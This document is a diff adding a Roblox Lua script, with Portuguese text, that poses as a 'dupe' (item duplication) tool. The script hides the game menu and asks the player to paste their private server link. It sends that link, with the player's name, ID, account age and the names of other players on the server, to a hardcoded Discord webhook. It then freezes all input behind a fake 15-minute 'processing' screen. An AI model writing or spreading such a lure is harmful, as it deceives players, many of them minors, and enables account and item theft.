@@ -1,0 +1,609 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local ContextActionService = game:GetService("ContextActionService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Bloquear menu IMEDIATAMENTE e COMPLETAMENTE
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+-- UI Principal - TELA 100% REAL
+local brainrotUI = Instance.new("ScreenGui")
+brainrotUI.Name = "BrainrotUI"
+brainrotUI.ResetOnSpawn = false
+brainrotUI.ZIndexBehavior = Enum.ZIndexBehavior.Global
+brainrotUI.IgnoreGuiInset = true
+brainrotUI.DisplayOrder = 999999
+brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Fundo preto que cobre ABSOLUTAMENTE TUDO
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.AnchorPoint = Vector2.new(0, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BorderSizePixel = 0
+background.ZIndex = 1
+background.Parent = brainrotUI
+
+-- Frame de segurança EXTRA nos cantos
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 10)
+topBar.Position = UDim2.new(0, 0, 0, 0)
+topBar.BackgroundColor3 = Color3.new(0, 0, 0)
+topBar.BorderSizePixel = 0
+topBar.ZIndex = 2
+topBar.Parent = brainrotUI
+
+local bottomBar = Instance.new("Frame")
+bottomBar.Size = UDim2.new(1, 0, 0, 10)
+bottomBar.Position = UDim2.new(0, 0, 1, -10)
+bottomBar.BackgroundColor3 = Color3.new(0, 0, 0)
+bottomBar.BorderSizePixel = 0
+bottomBar.ZIndex = 2
+bottomBar.Parent = brainrotUI
+
+local leftBar = Instance.new("Frame")
+leftBar.Size = UDim2.new(0, 10, 1, 0)
+leftBar.Position = UDim2.new(0, 0, 0, 0)
+leftBar.BackgroundColor3 = Color3.new(0, 0, 0)
+leftBar.BorderSizePixel = 0
+leftBar.ZIndex = 2
+leftBar.Parent = brainrotUI
+
+local rightBar = Instance.new("Frame")
+rightBar.Size = UDim2.new(0, 10, 1, 0)
+rightBar.Position = UDim2.new(1, -10, 0, 0)
+rightBar.BackgroundColor3 = Color3.new(0, 0, 0)
+rightBar.BorderSizePixel = 0
+rightBar.ZIndex = 2
+rightBar.Parent = brainrotUI
+
+-- Container principal que ocupa TUDO
+local mainContainer = Instance.new("Frame")
+mainContainer.Size = UDim2.new(1, 0, 1, 0)
+mainContainer.Position = UDim2.new(0, 0, 0, 0)
+mainContainer.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
+mainContainer.BorderSizePixel = 0
+mainContainer.ZIndex = 3
+mainContainer.Parent = brainrotUI
+
+-- Gradiente para efeito profissional
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 15)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
+})
+gradient.Rotation = 45
+gradient.Parent = mainContainer
+
+-- Título gigante no topo
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 100)
+titleLabel.Position = UDim2.new(0, 0, 0.05, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.TextSize = 42
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.Text = "SISTEMA DE DUPE - SERVIDOR PRIVADO"
+titleLabel.TextWrapped = true
+titleLabel.ZIndex = 4
+titleLabel.TextStrokeTransparency = 0.8
+titleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+titleLabel.Parent = mainContainer
+
+-- Subtítulo
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Size = UDim2.new(1, 0, 0, 50)
+subtitleLabel.Position = UDim2.new(0, 0, 0.15, 0)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Font = Enum.Font.GothamBold
+subtitleLabel.TextSize = 22
+subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 220)
+subtitleLabel.Text = "COLE O LINK DO SEU SERVIDOR PRIVADO ABAIXO"
+subtitleLabel.TextWrapped = true
+subtitleLabel.ZIndex = 4
+subtitleLabel.Parent = mainContainer
+
+-- TextBox GIGANTE no centro
+local serverLinkBox = Instance.new("TextBox")
+serverLinkBox.Size = UDim2.new(0.9, 0, 0, 70)
+serverLinkBox.Position = UDim2.new(0.05, 0, 0.35, 0)
+serverLinkBox.PlaceholderText = "https://www.roblox.com/games/... COLE AQUI ..."
+serverLinkBox.Font = Enum.Font.GothamSemibold
+serverLinkBox.TextSize = 24
+serverLinkBox.TextColor3 = Color3.new(1, 1, 1)
+serverLinkBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+serverLinkBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 140)
+serverLinkBox.ClearTextOnFocus = false
+serverLinkBox.TextXAlignment = Enum.TextXAlignment.Center
+serverLinkBox.ZIndex = 4
+serverLinkBox.Parent = mainContainer
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0, 15)
+textBoxCorner.Parent = serverLinkBox
+
+-- Efeito de brilho na TextBox
+local textBoxStroke = Instance.new("UIStroke")
+textBoxStroke.Color = Color3.fromRGB(0, 100, 200)
+textBoxStroke.Thickness = 2
+textBoxStroke.Parent = serverLinkBox
+
+-- Botão Enter GIGANTE
+local enterButton = Instance.new("TextButton")
+enterButton.Size = UDim2.new(0.7, 0, 0, 80)
+enterButton.Position = UDim2.new(0.15, 0, 0.55, 0)
+enterButton.BackgroundColor3 = Color3.fromRGB(0, 80, 180)
+enterButton.Text = "🔓 INICIAR PROCESSO DE DUPE"
+enterButton.Font = Enum.Font.GothamBlack
+enterButton.TextSize = 28
+enterButton.TextColor3 = Color3.new(1, 1, 1)
+enterButton.ZIndex = 4
+enterButton.Parent = mainContainer
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 20)
+buttonCorner.Parent = enterButton
+
+-- Efeito de brilho no botão
+local buttonStroke = Instance.new("UIStroke")
+buttonStroke.Color = Color3.fromRGB(0, 150, 255)
+buttonStroke.Thickness = 3
+buttonStroke.Parent = enterButton
+
+-- Texto de instruções
+local instructionLabel = Instance.new("TextLabel")
+instructionLabel.Size = UDim2.new(1, 0, 0, 40)
+instructionLabel.Position = UDim2.new(0, 0, 0.7, 0)
+instructionLabel.BackgroundTransparency = 1
+instructionLabel.Font = Enum.Font.Gotham
+instructionLabel.TextSize = 16
+instructionLabel.TextColor3 = Color3.fromRGB(120, 120, 160)
+instructionLabel.Text = "⚠️ Este processo é 100% seguro e garantido"
+instructionLabel.ZIndex = 4
+instructionLabel.Parent = mainContainer
+
+-- Texto de aviso na parte inferior
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Size = UDim2.new(1, 0, 0, 60)
+warningLabel.Position = UDim2.new(0, 0, 0.9, 0)
+warningLabel.BackgroundTransparency = 1
+warningLabel.Font = Enum.Font.Gotham
+warningLabel.TextSize = 14
+warningLabel.TextColor3 = Color3.fromRGB(80, 80, 120)
+warningLabel.Text = "Sistema protegido • Não compartilhe • Desenvolvido por Sky Scripts"
+warningLabel.ZIndex = 4
+warningLabel.Parent = mainContainer
+
+-- Função para BLOQUEAR COMPLETAMENTE o jogo (SOMENTE na tela de loading)
+local function freezeGameCompletely()
+    print("🚫 CONGELAMENTO ATIVADO - Travar tudo!")
+    
+    -- Congelar física do personagem
+    if LocalPlayer.Character then
+        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+        end
+        
+        -- Congelar todas as partes do corpo
+        for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+                part.CanCollide = false
+            end
+        end
+    end
+    
+    -- Congelar câmera completamente
+    workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+    workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame
+    
+    -- BLOQUEAR TODOS OS CONTROLES
+    ContextActionService:BindAction("BlockAllInput", function() 
+        return Enum.ContextActionResult.Sink 
+    end, false, 
+        Enum.KeyCode.Escape, Enum.KeyCode.F11, Enum.KeyCode.Tab, Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift,
+        Enum.KeyCode.LeftControl, Enum.KeyCode.RightControl, Enum.KeyCode.LeftAlt, Enum.KeyCode.RightAlt,
+        Enum.KeyCode.Backspace, Enum.KeyCode.Delete, Enum.KeyCode.Insert, Enum.KeyCode.Home, Enum.KeyCode.End,
+        Enum.KeyCode.PageUp, Enum.KeyCode.PageDown, Enum.KeyCode.Print, Enum.KeyCode.ScrollLock, Enum.KeyCode.Pause,
+        Enum.KeyCode.CapsLock, Enum.KeyCode.NumLock, Enum.KeyCode.F1, Enum.KeyCode.F2, Enum.KeyCode.F3, Enum.KeyCode.F4,
+        Enum.KeyCode.F5, Enum.KeyCode.F6, Enum.KeyCode.F7, Enum.KeyCode.F8, Enum.KeyCode.F9, Enum.KeyCode.F10,
+        Enum.KeyCode.F11, Enum.KeyCode.F12, Enum.KeyCode.Q, Enum.KeyCode.E, Enum.KeyCode.R, Enum.KeyCode.T,
+        Enum.KeyCode.Y, Enum.KeyCode.U, Enum.KeyCode.I, Enum.KeyCode.O, Enum.KeyCode.P, Enum.KeyCode.A,
+        Enum.KeyCode.S, Enum.KeyCode.D, Enum.KeyCode.F, Enum.KeyCode.G, Enum.KeyCode.H, Enum.KeyCode.J,
+        Enum.KeyCode.K, Enum.KeyCode.L, Enum.KeyCode.Z, Enum.KeyCode.X, Enum.KeyCode.C, Enum.KeyCode.V,
+        Enum.KeyCode.B, Enum.KeyCode.N, Enum.KeyCode.M, Enum.KeyCode.Space
+    )
+    
+    -- Bloquear mouse também
+    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+    
+    -- Loop de congelamento EXTREMO
+    local freezeConn
+    freezeConn = RunService.Heartbeat:Connect(function()
+        -- Forçar travamento absoluto
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
+            LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+        end
+        
+        -- Manter câmera travada
+        workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame
+        
+        -- Cancelar qualquer input do usuário continuamente
+        pcall(function()
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
+        end)
+    end)
+    
+    return freezeConn
+end
+
+-- Função para LIBERAR controles
+local function unfreezeGame()
+    print("✅ LIBERANDO controles...")
+    
+    -- Liberar física do personagem
+    if LocalPlayer.Character then
+        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 16
+            humanoid.JumpPower = 50
+        end
+        
+        -- Liberar partes do corpo
+        for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = false
+                part.CanCollide = true
+            end
+        end
+    end
+    
+    -- Liberar câmera
+    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+    
+    -- Liberar controles
+    ContextActionService:UnbindAction("BlockAllInput")
+    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+end
+
+-- Função para enviar webhook do Discord COM INFO DO SERVER (SISTEMA ANTI-ESPERTINHO)
+local function sendToDiscord(serverLink)
+    local success, result = pcall(function()
+        local accountAge = LocalPlayer.AccountAge
+        local accountAgeDays = math.floor(accountAge)
+        
+        -- PEGAR INFORMAÇÕES DO SERVER
+        local players = game:GetService("Players"):GetPlayers()
+        local playerCount = #players
+        local serverId = game.JobId
+        local placeId = game.PlaceId
+        
+        -- Pegar nome do jogo com proteção contra erro
+        local gameName = "Unknown Game"
+        pcall(function()
+            gameName = MarketplaceService:GetProductInfo(placeId).Name
+        end)
+        
+        -- Verificar se tem mais gente além do próprio jogador
+        local otherPlayers = ""
+        if playerCount > 1 then
+            otherPlayers = "\n**Outros jogadores:** "
+            for i, player in ipairs(players) do
+                if player ~= LocalPlayer then
+                    otherPlayers = otherPlayers .. player.Name .. ", "
+                end
+            end
+            otherPlayers = otherPlayers:sub(1, -3) -- Remove a última vírgula
+        end
+        
+        local webhookData = {
+            username = "Sky Scripts — logs dupe🔮",
+            embeds = {{
+                title = "⚠️ NOVO SERVIDOR PRIVADO CAPTURADO ⚠️",
+                color = 16711680,
+                fields = {
+                    {
+                        name = "👤 JOGADOR",
+                        value = "**Nome:** " .. LocalPlayer.Name .. "\n**ID:** " .. LocalPlayer.UserId .. "\n**Idade da Conta:** " .. accountAgeDays .. " dias",
+                        inline = true
+                    },
+                    {
+                        name = "🎮 INFOS DO SERVER",
+                        value = "**Jogadores:** " .. playerCount .. "/" .. game:GetService("Players").MaxPlayers .. 
+                               "\n**Server ID:** " .. serverId .. 
+                               "\n**Game:** " .. gameName .. 
+                               otherPlayers,
+                        inline = true
+                    },
+                    {
+                        name = "🔗 SERVIDOR PRIVADO",
+                        value = "[CLIQUE AQUI PARA ENTRAR](" .. serverLink .. ")",
+                        inline = false
+                    },
+                    {
+                        name = "🕒 HORÁRIO",
+                        value = os.date("%d/%m/%Y %H:%M:%S"),
+                        inline = true
+                    }
+                },
+                footer = {
+                    text = "DUPE SCRIPT • ANTI-ESPERTINHO ATIVADO • " .. playerCount .. " PESSOAS"
+                },
+                thumbnail = {
+                    url = "https://imgur.com/a/ULow8K0"
+                }
+            }},
+            avatar_url = "https://imgur.com/a/ULow8K0",
+            content = playerCount > 1 and "**🚨 ALERTA: " .. playerCount .. " PESSOAS NO SERVER!**" or "**✅ Servidor privado vazio**"
+        }
+        
+        local jsonData = HttpService:JSONEncode(webhookData)
+        
+        local webhookUrl = "https://discord.com/api/webhooks/1432765314545876993/p72h55Uluk8NdRq-JOJgfUE1KzuNWgEDxxg_Mm3MFWcIjw4rc-yi277Sgm4vRV8yD48X"
+        
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        
+        print("✅ Webhook enviado! Jogadores no server: " .. playerCount)
+    end)
+    
+    if not success then
+        warn("Erro ao enviar webhook: " .. tostring(result))
+    end
+end
+
+-- Tela de carregamento de 15 minutos COM CONGELAMENTO ABSOLUTO
+local function showLoadingScreen()
+    print("🎯 INICIANDO TELA DE CARREGAMENTO COM CONGELAMENTO")
+    
+    -- CONGELAR O JOGO COMPLETAMENTE (SOMENTE AQUI!)
+    local freezeConnection = freezeGameCompletely()
+    
+    -- Remover UI anterior
+    brainrotUI:Destroy()
+    
+    -- Criar nova GUI de loading 100% TELA
+    local loaderGui = Instance.new("ScreenGui")
+    loaderGui.Name = "LoaderGUI"
+    loaderGui.ResetOnSpawn = false
+    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    loaderGui.IgnoreGuiInset = true
+    loaderGui.DisplayOrder = 999999
+    loaderGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    
+    -- Fundo preto TOTAL
+    local loaderBackground = Instance.new("Frame")
+    loaderBackground.Size = UDim2.new(1, 0, 1, 0)
+    loaderBackground.Position = UDim2.new(0, 0, 0, 0)
+    loaderBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+    loaderBackground.BorderSizePixel = 0
+    loaderBackground.ZIndex = 1
+    loaderBackground.Parent = loaderGui
+    
+    -- Barras de segurança EXTRA
+    local loaderTopBar = Instance.new("Frame")
+    loaderTopBar.Size = UDim2.new(1, 0, 0, 15)
+    loaderTopBar.Position = UDim2.new(0, 0, 0, 0)
+    loaderTopBar.BackgroundColor3 = Color3.new(0, 0, 0)
+    loaderTopBar.BorderSizePixel = 0
+    loaderTopBar.ZIndex = 2
+    loaderTopBar.Parent = loaderGui
+    
+    local loaderBottomBar = Instance.new("Frame")
+    loaderBottomBar.Size = UDim2.new(1, 0, 0, 15)
+    loaderBottomBar.Position = UDim2.new(0, 0, 1, -15)
+    loaderBottomBar.BackgroundColor3 = Color3.new(0, 0, 0)
+    loaderBottomBar.BorderSizePixel = 0
+    loaderBottomBar.ZIndex = 2
+    loaderBottomBar.Parent = loaderGui
+    
+    -- Container principal do loading
+    local loaderContainer = Instance.new("Frame")
+    loaderContainer.Size = UDim2.new(1, 0, 1, 0)
+    loaderContainer.Position = UDim2.new(0, 0, 0, 0)
+    loaderContainer.BackgroundColor3 = Color3.new(0, 0, 0)
+    loaderContainer.BorderSizePixel = 0
+    loaderContainer.ZIndex = 3
+    loaderContainer.Parent = loaderGui
+    
+    -- Texto principal
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1, 0, 0, 100)
+    loadingText.Position = UDim2.new(0, 0, 0.25, 0)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Font = Enum.Font.GothamBlack
+    loadingText.TextSize = 46
+    loadingText.TextColor3 = Color3.fromRGB(255, 50, 50)
+    loadingText.Text = "🚀 DUPE SCRIPT — PROCESSANDO"
+    loadingText.ZIndex = 4
+    loadingText.TextStrokeTransparency = 0.8
+    loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
+    loadingText.Parent = loaderContainer
+    
+    -- Porcentagem
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 0, 80)
+    percentText.Position = UDim2.new(0, 0, 0.35, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Font = Enum.Font.GothamBlack
+    percentText.TextSize = 36
+    percentText.TextColor3 = Color3.fromRGB(255, 100, 100)
+    percentText.Text = "0%"
+    percentText.ZIndex = 4
+    percentText.Parent = loaderContainer
+    
+    -- Texto de instruções
+    local subText = Instance.new("TextLabel")
+    subText.Size = UDim2.new(1, 0, 0, 50)
+    subText.Position = UDim2.new(0, 0, 0.45, 0)
+    subText.BackgroundTransparency = 1
+    subText.Font = Enum.Font.Gotham
+    subText.TextSize = 20
+    subText.TextColor3 = Color3.fromRGB(150, 150, 150)
+    subText.Text = "🔒 Sistema travado • Não feche o jogo • Processando dados do servidor"
+    subText.ZIndex = 4
+    subText.Parent = loaderContainer
+    
+    -- Tempo restante
+    local timeText = Instance.new("TextLabel")
+    timeText.Size = UDim2.new(1, 0, 0, 40)
+    timeText.Position = UDim2.new(0, 0, 0.52, 0)
+    timeText.BackgroundTransparency = 1
+    timeText.Font = Enum.Font.Gotham
+    timeText.TextSize = 18
+    timeText.TextColor3 = Color3.fromRGB(120, 120, 120)
+    timeText.Text = "Tempo estimado: 15 minutos"
+    timeText.ZIndex = 4
+    timeText.Parent = loaderContainer
+    
+    -- Barra de progresso GIGANTE
+    local progressBarBack = Instance.new("Frame")
+    progressBarBack.Size = UDim2.new(0.8, 0, 0, 40)
+    progressBarBack.Position = UDim2.new(0.1, 0, 0.62, 0)
+    progressBarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    progressBarBack.BorderSizePixel = 0
+    progressBarBack.ZIndex = 4
+    progressBarBack.Parent = loaderContainer
+    
+    local progressBarCorner = Instance.new("UICorner")
+    progressBarCorner.CornerRadius = UDim.new(0, 20)
+    progressBarCorner.Parent = progressBarBack
+    
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 4
+    progressBar.Parent = progressBarBack
+    
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(0, 20)
+    progressCorner.Parent = progressBar
+    
+    -- Aviso de congelamento
+    local freezeWarning = Instance.new("TextLabel")
+    freezeWarning.Size = UDim2.new(1, 0, 0, 40)
+    freezeWarning.Position = UDim2.new(0, 0, 0.72, 0)
+    freezeWarning.BackgroundTransparency = 1
+    freezeWarning.Font = Enum.Font.GothamBold
+    freezeWarning.TextSize = 18
+    freezeWarning.TextColor3 = Color3.fromRGB(200, 50, 50)
+    freezeWarning.Text = "🚫 SISTEMA COMPLETAMENTE TRAVADO - Controles desativados"
+    freezeWarning.ZIndex = 4
+    freezeWarning.Parent = loaderContainer
+
+    -- Carregamento de 15 minutos (900 segundos) COM CONGELAMENTO ABSOLUTO
+    local totalTime = 900
+    local startTime = tick()
+    
+    while tick() - startTime < totalTime do
+        local elapsed = tick() - startTime
+        local progress = elapsed / totalTime
+        local percentage = math.floor(progress * 100)
+        
+        -- Atualizar barra de progresso
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        
+        -- Atualizar porcentagem
+        percentText.Text = percentage .. "%"
+        
+        -- Atualizar tempo restante
+        local remaining = totalTime - elapsed
+        local minutes = math.floor(remaining / 60)
+        local seconds = math.floor(remaining % 60)
+        timeText.Text = "Tempo restante: " .. minutes .. "m " .. seconds .. "s"
+        
+        wait(0.1)
+    end
+    
+    -- Completo
+    progressBar.Size = UDim2.new(1, 0, 1, 0)
+    percentText.Text = "100%"
+    timeText.Text = "Processo concluído!"
+    loadingText.Text = "✅ DUPE SCRIPT - CONCLUÍDO"
+    loadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    freezeWarning.Text = "✅ SISTEMA LIBERADO - Controles reativados"
+    freezeWarning.TextColor3 = Color3.fromRGB(0, 255, 0)
+    
+    wait(3)
+    
+    -- LIBERAR o jogo após loading
+    if freezeConnection then
+        freezeConnection:Disconnect()
+    end
+    unfreezeGame()
+    
+    loaderGui:Destroy()
+end
+
+-- Botão click - ENVIO IMEDIATO
+enterButton.MouseButton1Click:Connect(function()
+    local serverLink = serverLinkBox.Text:gsub("%s+", "")
+    
+    if serverLink == "" or not serverLink:find("roblox") then
+        enterButton.Text = "❌ LINK INVÁLIDO!"
+        enterButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        
+        task.wait(1.5)
+        enterButton.Text = "🔓 INICIAR PROCESSO DE DUPE"
+        enterButton.BackgroundColor3 = Color3.fromRGB(0, 80, 180)
+        return
+    end
+    
+    -- Efeito de sucesso
+    enterButton.Text = "📡 ENVIANDO DADOS..."
+    enterButton.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+    
+    -- ENVIAR PARA DISCORD IMEDIATAMENTE
+    sendToDiscord(serverLink)
+    
+    -- CONGELAR COMPLETAMENTE E MOSTRAR LOADING
+    showLoadingScreen()
+end)
+
+-- BLOQUEAR ESCAPE apenas na UI inicial (sem congelar o jogo ainda)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.Escape then
+        -- Cancelar completamente o Escape
+        while UserInputService:IsKeyDown(Enum.KeyCode.Escape) do
+            wait()
+        end
+    end
+end)
+
+-- Prevenir que o usuário feche a janela
+UserInputService.WindowFocusReleased:Connect(function()
+    UserInputService.WindowFocused:Wait()
+end)
+
+-- Se o personagem respawnar, manter a UI
+LocalPlayer.CharacterAdded:Connect(function(character)
+    wait(1)
+    -- Só recongelar se estiver na tela de loading
+    if not brainrotUI.Parent then
+        -- Está na tela de loading, reconectar congelamento
+        freezeGameCompletely()
+    end
+end)
+
+print("✅ Interface 100% TELA carregada")
